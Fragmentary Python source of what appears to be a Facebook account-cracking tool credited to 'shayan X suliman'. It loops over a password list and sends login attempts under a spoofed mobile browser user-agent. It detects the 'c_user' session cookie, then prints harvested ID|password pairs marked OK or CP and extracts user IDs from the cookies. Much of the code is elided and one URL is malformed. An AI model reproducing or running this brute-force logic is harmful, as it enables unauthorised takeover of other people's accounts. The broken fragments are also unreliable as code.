...
os.system("xdg-open https://https://www.facebook.com/ShaYan007king?mibextid=ZbWKwL /")
def menu_apikey():
...
|  $$$$$$/| $$ \  $$
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    Author   :\033[1;36m shayan X suliman
    Facebook : \033[1;34mfacebook.com.shayano007
    Connect  : \033[1;32m03******
    Version : 1.0.1 
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Ali:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[1;31m [SK -CP] '+ids+' | '+pas+'\033[1;97m')
...
def rcrack_free(idf,pwv):
    ...
    #        print(idf+'|'+ps)
       ...
       'user-agent': 'Mozilla/5.0 (Android 10; Mobile; rv:114.0esr) Gecko/114.0esr Firefox/114.0esr',
}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\n')
                print('\033[1;92m[SK -OK] '+idf+' | '+ps+'\033[0;97m')
                cek_apk(coki)
                ...
                cid = coki[141:156]
                print('\n')
                print('\033[1;91m[SK -CP] '+idf+' | '+ps+'\033[0;97m')
